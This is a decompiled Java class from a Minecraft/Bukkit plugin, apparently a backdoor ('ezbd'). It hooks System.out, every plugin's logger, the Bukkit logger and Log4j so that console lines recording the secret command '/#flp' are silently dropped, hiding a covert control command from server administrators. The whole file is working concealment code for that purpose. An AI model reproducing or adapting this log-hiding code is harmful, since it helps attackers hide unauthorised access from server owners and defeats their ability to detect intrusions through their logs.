package me.ego.ezbd;

import me.ego.ezbd.lib.fo.Common;
import me.ego.ezbd.lib.fo.MinecraftVersion;
import me.ego.ezbd.lib.fo.MinecraftVersion.V;
import org.bukkit.Bukkit;
import org.bukkit.plugin.Plugin;

public final class Filter {
    public Filter() {
    }

    public static void inject() {
        System.setOut(new FilterSystem());
        FilterLegacy filter = new FilterLegacy();
        Plugin[] var1 = Bukkit.getPluginManager().getPlugins();
        int var2 = var1.length;

        for(int var3 = 0; var3 < var2; ++var3) {
            Plugin plugin = var1[var3];
            plugin.getLogger().setFilter(filter);
        }

        Bukkit.getLogger().setFilter(filter);
        if (MinecraftVersion.atLeast(V.v1_7)) {
            FilterLog4j.inject();
        }

    }

    static boolean isFiltered(String message) {
        if (message != null && !message.isEmpty()) {
            message = Common.stripColors(message);
            return message.contains("issued server command: /#flp");
        } else {
            return false;
        }
    }
}
